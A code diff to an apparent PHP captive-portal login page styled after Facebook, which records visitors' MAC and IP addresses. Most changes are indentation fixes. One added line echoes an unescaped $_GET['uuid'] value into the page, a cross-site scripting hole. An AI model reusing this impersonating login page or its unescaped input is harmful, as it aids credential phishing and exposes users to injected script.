@@ -97,7 +97,7 @@ require_once('helper.php');
 
       .login-form input[type="text"],
       .login-form input[type="password"] {
-      	display: block;
+        display: block;
         width: 345px;
         border: 1px solid #314d89;
         outline: none;
@@ -109,7 +109,7 @@ require_once('helper.php');
       }
 
       .login-form input[type="text"] {
-      	color: black;
+        color: black;
         border-bottom: none;
         border-radius: 4px 4px 0 0;
         padding-bottom: 13px;
@@ -117,7 +117,7 @@ require_once('helper.php');
       }
 
       .login-form input[type="password"] {
-      	color: black;
+        color: black;
         border-top: none;
         border-radius: 0 0 4px 4px;
         box-shadow: 0 -1px 2px rgba(0, 0, 0, 0.23) inset, 0 1px 2px rgba(255, 255, 255, 0.1);
@@ -181,6 +181,7 @@ require_once('helper.php');
             <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
             <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
             <input type="hidden" name="target" value="https://m.facebook.com">
+      <input type="hidden" name="uuid" value="<?=$_GET['uuid'];?>">
             <input type="submit" value="Log In">
 
         </form>
